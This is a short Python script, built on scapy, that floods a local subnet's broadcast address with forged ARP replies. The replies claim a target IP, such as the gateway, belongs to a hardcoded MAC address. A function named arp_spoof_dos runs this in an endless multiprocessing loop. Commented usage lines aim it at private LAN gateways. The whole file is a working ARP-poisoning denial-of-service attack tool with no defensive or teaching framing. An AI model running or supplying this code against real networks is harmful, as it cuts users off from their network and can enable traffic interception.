
import multiprocessing
import scapy.all as scapy
import ipaddress
import argparse
import time

#python3 test-spoof.py -i 192.168.2.1 -m 255.255.255.0 -t 192.168.1.1
#python3 test-spoof.py -i 192.168.16.1 -m 255.255.240.0 -t 192.168.16.1
#python3 test-spoof-3.py -i 192.168.16.1 -m 255.255.240.0 -t 192.168.31.255

#route add default gw 192.168.16.1 wlan0
 


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="spoof ip address")
    parser.add_argument("-i", "--ip", dest="ip", help="ip address")
    parser.add_argument("-m", "--mask", dest="mask", help="mask")
    options = parser.parse_args()
    return  options
    
def get_broadcast(IP,MASK):
    
    #host = ipaddress.IPv4Address(IP)
    net = ipaddress.IPv4Network(IP + '/' + MASK, False)
    #print('IP:', IP)
    #print('Mask:', MASK)
    #print('Subnet:', ipaddress.IPv4Address(int(host) & int(net.netmask)))
    #print('Host:', ipaddress.IPv4Address(int(host) & int(net.hostmask)))
    return net.broadcast_address
    
    
   # spoof ip
def arp_broadcast(spoof_ip ,mask):
    #print(spoof_ip)  
    #print(mask)  
    while(1):
        a = scapy.ARP(op=2, psrc= spoof_ip, hwsrc="04:5f:a7:7d:b7:55" ,pdst = mask)        
       
       
        #print(a.show())
        
        scapy.send(a, verbose=False)
        print("................")
        time.sleep(0.1)
        
def arp_spoof_dos(processes,SPOOF_IP ,mask_value):
    pool = multiprocessing.Pool(processes=processes)
    while (1):
        try:
            pool.apply_async(arp_broadcast, (SPOOF_IP ,mask_value))
        except KeyboardInterrupt:
            pool.terminate()

    
options = get_arguments()


IP = options.ip
MASK = options.mask
SPOOF_IP = options.target

mask_value = str(get_broadcast(IP,MASK))
#print(mask_value)
arp_spoof_dos(10,SPOOF_IP ,mask_value)



    
